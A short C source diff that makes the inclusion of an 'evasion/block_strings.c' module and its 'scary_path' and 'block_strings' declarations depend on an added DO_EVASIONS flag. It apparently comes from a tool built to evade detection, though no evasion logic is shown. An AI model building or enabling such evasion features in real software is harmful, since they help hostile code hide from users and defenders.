@@ -3,7 +3,7 @@
 
 #include "files/files.h"
 
-#ifdef BLOCK_STRINGS
+#if defined(BLOCK_STRINGS) && defined(DO_EVASIONS)
 int scary_path(char *string);
 int block_strings(char *const argv[]);
 #include "evasion/block_strings.c"
